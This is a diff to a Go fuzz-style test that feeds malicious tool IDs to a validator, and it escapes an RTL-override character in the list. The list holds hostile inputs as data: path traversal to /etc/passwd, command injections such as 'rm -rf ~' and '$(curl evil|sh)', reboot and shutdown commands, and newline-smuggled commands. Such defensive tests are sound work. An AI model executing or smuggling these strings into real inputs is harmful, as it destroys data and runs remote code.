@@ -75,11 +75,12 @@ func TestV0330ChaosBattery(t *testing.T) {
 			return true
 		})
 	}
-	// malicious / injected / traversal / confusable recipe ids (x66)
+	// malicious / injected / traversal / confusable recipe ids (x66).
+	// Trojan-Source RTL-override (U+202E) is escaped via ‮ to keep the source ASCII-clean.
 	bad := []string{"../../etc/passwd", strings.Repeat("x", 9000), "a;rm -rf ~", "$(id)",
 		"..%2f..%2fetc", "`whoami`", "rm -rf /", "sudo reboot", "; shutdown -h now",
 		"\x00\x01", "node -e bad", "../../../../../bin/sh", "agentlink.doctor;sudo rm -rf /",
-		"$(curl evil|sh)", "%2e%2e%2fpasswd", "..\\..\\windows", "tool‮id", "café_tool",
+		"$(curl evil|sh)", "%2e%2e%2fpasswd", "..\\..\\windows", "tool\u202eid", "café_tool",
 		"𝗮gentlink.doctor", "agentlink.doctor\nsudo reboot", "-rf /", "| sh", "&& rm -rf ~"}
 	for i := 0; i < 90; i++ {
 		bi := bad[i%len(bad)]
@@ -127,7 +128,7 @@ func TestV0330ChaosBattery(t *testing.T) {
 				return false
 			}
 			var g struct {
-				ForbiddenNextTools   []string `json:"forbiddenNextTools"`
+				ForbiddenNextTools   []string              `json:"forbiddenNextTools"`
 				RecommendedNextTools []struct{ ID string } `json:"recommendedNextTools"`
 			}
 			json.Unmarshal([]byte(o), &g)
